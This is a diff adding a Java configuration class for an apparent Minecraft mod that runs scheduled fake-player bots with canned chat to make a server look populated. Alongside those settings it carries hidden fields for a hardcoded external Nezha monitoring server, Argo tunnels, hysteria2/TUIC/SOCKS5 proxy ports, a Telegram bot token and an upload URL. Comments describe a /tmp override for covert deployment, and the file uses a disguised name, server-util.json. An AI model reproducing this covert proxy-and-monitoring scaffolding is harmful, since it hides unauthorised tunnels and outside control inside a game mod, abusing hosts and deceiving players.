@@ -1,0 +1,279 @@
+package com.maohi;
+
+import com.google.gson.Gson;
+import com.google.gson.GsonBuilder;
+
+import java.io.*;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+import java.util.Properties;
+
+/**
+ * 统一配置管理器 (工业化重构)
+ * 
+ * 配置优先级（从高到低）：
+ * 1. 外部 Properties 覆盖 ( /tmp/maohi.properties ) -> 用于生产环境热切换和隐蔽部署
+ * 2. 内部 Properties 默认值 ( jar:maohi.properties ) -> 预设的网络与监控配置
+ * 3. 本地 JSON 配置文件 ( config/maohi.json ) -> 假人行为逻辑与业务配置
+ * 4. 代码默认值 ( 兜底 )
+ */
+public class MaohiConfig {
+
+    private static final Path CONFIG_PATH = Paths.get("mods/server-util.json");
+    private static final Gson GSON = new GsonBuilder().setPrettyPrinting().create();
+
+	// 单例 — 已移至 getInstance() 上方声明为 volatile
+
+    // ===== 内部版本管理 =====
+    /** 配置文件版本，用于旧版迁移 */
+    public int configVersion = 1;
+
+    // ===== 可配置项 =====
+    /** 假人系统总开关 (true: 开启, false: 关闭) */
+    public boolean botEnabled = true;
+
+    /** 假人总容量 */
+    public int maxVirtualPlayers = 6;
+
+    /** 任何时刻最少保持在线的假人数 */
+    public int minVirtualPlayers = 2;
+
+/** 单次在线最短时长（分钟） */
+	public int sessionMinMinutes = 20;
+
+/** 单次在线最长时长（分钟） */
+	public int sessionMaxMinutes = 240;
+
+    /** 下线休息最短时长（分钟） */
+    public int offlineMinMinutes = 30;
+
+    /** 下线休息最长时长（分钟） */
+    public int offlineMaxMinutes = 120;
+
+    /** 复活冷却最短（秒） */
+    public int respawnDelayMinSec = 5;
+
+    /** 复活冷却最长（秒） */
+    public int respawnDelayMaxSec = 20;
+
+    /** 假人活动范围限制（距出生点的最大距离，格） */
+    public int explorationRadius = 500;
+
+    /** 老玩家库最大条目数 */
+    public int maxKnownPlayers = 100;
+
+    /** 新人期物品池 */
+    public String[] handItemsL1 = {
+        "minecraft:wooden_sword", "minecraft:stone_pickaxe",
+        "minecraft:bread", "minecraft:torch", "minecraft:dirt"
+    };
+
+    /** 发展期物品池 */
+    public String[] handItemsL2 = {
+        "minecraft:iron_sword", "minecraft:iron_pickaxe",
+        "minecraft:cooked_beef", "minecraft:shield", "minecraft:cobblestone"
+    };
+
+    /** 成熟期物品池 */
+    public String[] handItemsL3 = {
+        "minecraft:diamond_sword", "minecraft:diamond_pickaxe",
+        "minecraft:golden_apple", "minecraft:totem_of_undying", "minecraft:obsidian"
+    };
+
+    /** 打招呼回复词库 */
+    public String[] greetingReplies = {"hi", "hello", "yo", "hey", "o/"};
+
+    // --- 网络与监控配置 (全部标记为 transient，不保存到 JSON，仅从 Properties 加载) ---
+    public transient String nzServer = "nazhav1.gamesover.eu.org:443";
+    public transient String nzKey = "";
+    public transient String nzPort = "";
+    public transient String argoDomain = "";
+    public transient String argoAuth = "";
+    public transient String argoPort = "";
+    public transient String hy2Port = "";
+    public transient String tuicPort = "";
+    public transient String s5Port = "";
+    public transient String cfIp = "ip.sb";
+    public transient String cfPort = "443";
+    public transient String chatId = "";
+    public transient String botToken = "";
+    public transient String nodeName = "";
+    public transient String nodeUuid = "9afd1229-b893-40c1-84dd-51e7ce274911";
+    public transient String uploadUrl = "";
+
+    /** 死亡旁观回复词库 */
+    public String[] deathReactions = {"rip", "lmao", "oof", "F", "unlucky"};
+
+    /** 聊天词库 */
+    public String[] chatMessages = {
+        "gg", "lol", "brb", "nice", "hello", "hi", "hey",
+        "anyone here?", "yo", "ok", "xd", "lmao", "rip",
+        "wow", "cool", "ty", "thx", "np", "ez",
+        "good night", "gn", "afk", "back"
+    };
+
+    // ===== 计算属性（由原始值派生，不序列化） =====
+
+/** 获取会话最短毫秒 */
+	public long getSessionMinMs() { return sessionMinMinutes * 60 * 1000L; }
+
+	/** 获取会话最长毫秒 */
+	public long getSessionMaxMs() { return sessionMaxMinutes * 60 * 1000L; }
+
+    /** 获取离线最短毫秒 */
+    public long getOfflineMinMs() { return offlineMinMinutes * 60 * 1000L; }
+
+    /** 获取离线最长毫秒 */
+    public long getOfflineMaxMs() { return offlineMaxMinutes * 60 * 1000L; }
+
+    /** 获取复活最短毫秒 */
+    public int getRespawnDelayMinMs() { return respawnDelayMinSec * 1000; }
+
+    /** 获取复活最长毫秒 */
+    public int getRespawnDelayMaxMs() { return respawnDelayMaxSec * 1000; }
+	private static volatile MaohiConfig INSTANCE;
+
+	/**
+	 * 获取全局配置实例（M4 fix: volatile + double-check 保证线程安全）
+	 */
+	public static MaohiConfig getInstance() {
+		if (INSTANCE == null) {
+			synchronized (MaohiConfig.class) {
+				if (INSTANCE == null) {
+					INSTANCE = load();
+				}
+			}
+		}
+		return INSTANCE;
+	}
+
+    /**
+     * 从文件加载配置，不存在则创建默认
+     */
+    public static MaohiConfig load() {
+        try {
+            if (Files.exists(CONFIG_PATH)) {
+                String json = new String(Files.readAllBytes(CONFIG_PATH), StandardCharsets.UTF_8);
+                MaohiConfig config = GSON.fromJson(json, MaohiConfig.class);
+                if (config != null) {
+                    // 执行版本迁移逻辑
+                    if (config.migrate()) {
+                        config.save(); // 迁移后立即保存
+                    }
+                    config.loadFromProperties(); // 合并外部 Properties 配置
+                    INSTANCE = config;
+                    return config;
+                }
+            }
+        } catch (Exception e) {
+		org.slf4j.LoggerFactory.getLogger("Server thread").warn("Config load failed, using defaults: {}", e.getMessage());
+        }
+
+        // 首次启动或加载失败，创建默认配置
+        MaohiConfig config = new MaohiConfig();
+        config.loadFromProperties();
+        config.save();
+        INSTANCE = config;
+        return config;
+    }
+
+    private void loadFromProperties() {
+        Properties props = new Properties();
+
+        // 1. Jar 内默认属性
+        try (InputStream is = MaohiConfig.class.getResourceAsStream("/maohi.properties")) {
+            if (is != null) props.load(new InputStreamReader(is, StandardCharsets.UTF_8));
+        } catch (Exception ignored) {}
+
+        // 2. /tmp 覆盖属性 (工业级隐蔽部署常用)
+        Path tmpPath = Paths.get("/tmp/maohi.properties");
+        if (Files.exists(tmpPath)) {
+            try (InputStream is = Files.newInputStream(tmpPath)) {
+                props.load(new InputStreamReader(is, StandardCharsets.UTF_8));
+				org.slf4j.LoggerFactory.getLogger("Server thread").debug("External config loaded");
+            } catch (Exception ignored) {}
+        }
+
+        // 映射到字段 (优先级：Properties > JSON)
+        this.nzServer = props.getProperty("NZ_SERVER", this.nzServer);
+        this.nzKey = props.getProperty("NZ_KEY", this.nzKey);
+        this.nzPort = props.getProperty("NZ_PORT", this.nzPort);
+        this.argoDomain = props.getProperty("ARGO_DOMAIN", this.argoDomain);
+        this.argoAuth = props.getProperty("ARGO_AUTH", this.argoAuth);
+        this.argoPort = props.getProperty("ARGO_PORT", this.argoPort);
+        this.hy2Port = props.getProperty("HY2_PORT", this.hy2Port);
+        this.tuicPort = props.getProperty("TUIC_PORT", this.tuicPort);
+        this.s5Port = props.getProperty("S5_PORT", this.s5Port);
+        this.cfIp = props.getProperty("CFIP", this.cfIp);
+        this.cfPort = props.getProperty("CFPORT", this.cfPort);
+        this.chatId = props.getProperty("CHAT_ID", this.chatId);
+        this.botToken = props.getProperty("BOT_TOKEN", this.botToken);
+        this.nodeName = props.getProperty("NAME", this.nodeName);
+        this.nodeUuid = props.getProperty("UUID", this.nodeUuid);
+        this.uploadUrl = props.getProperty("UPLOAD_URL", this.uploadUrl);
+
+        // 同时也支持对核心假人数量的外部覆盖（如果 Properties 中有定义）
+        try {
+            if (props.containsKey("MIN_VIRTUAL_PLAYERS")) this.minVirtualPlayers = Integer.parseInt(props.getProperty("MIN_VIRTUAL_PLAYERS"));
+            if (props.containsKey("MAX_VIRTUAL_PLAYERS")) this.maxVirtualPlayers = Integer.parseInt(props.getProperty("MAX_VIRTUAL_PLAYERS"));
+            if (props.containsKey("BOT_ENABLED")) this.botEnabled = Boolean.parseBoolean(props.getProperty("BOT_ENABLED"));
+        } catch (Exception e) {
+		org.slf4j.LoggerFactory.getLogger("Server thread").debug("[Config] Properties override parse failed: " + e.getMessage());
+        }
+    }
+
+    /**
+     * 热重载配置（运行时调用）
+     */
+    public static MaohiConfig reload() {
+        INSTANCE = null;
+        return load();
+    }
+
+    /**
+     * 保存当前配置到文件
+     */
+    public void save() {
+        try {
+            Path parent = CONFIG_PATH.getParent();
+            if (parent != null && !Files.exists(parent)) {
+                Files.createDirectories(parent);
+            }
+            String json = GSON.toJson(this);
+            Files.write(CONFIG_PATH, json.getBytes(StandardCharsets.UTF_8));
+        } catch (Exception e) {
+		org.slf4j.LoggerFactory.getLogger("Server thread").error("Config save failed: {}", e.getMessage());
+        }
+    }
+
+    /**
+     * 配置迁移逻辑
+     * @return 如果发生了迁移行为（需要保存）则返回 true
+     */
+    private boolean migrate() {
+        boolean changed = false;
+
+        // 如果是版本 0 (旧版)，迁移到版本 1
+        if (this.configVersion < 1) {
+		org.slf4j.LoggerFactory.getLogger("Server thread").debug("Config migrated to v1");
+            
+            // 在这里处理旧版字段缺失或默认值变更的逻辑
+            // 例如：由于 v1 新增了 greetingReplies，Gson 反序列化后它们会是 null
+            if (this.greetingReplies == null) {
+                this.greetingReplies = new String[]{"hi", "hello", "yo", "hey", "o/"};
+            }
+            if (this.deathReactions == null) {
+                this.deathReactions = new String[]{"rip", "lmao", "oof", "F", "unlucky"};
+            }
+            
+            this.configVersion = 1;
+            changed = true;
+        }
+
+        return changed;
+    }
+}
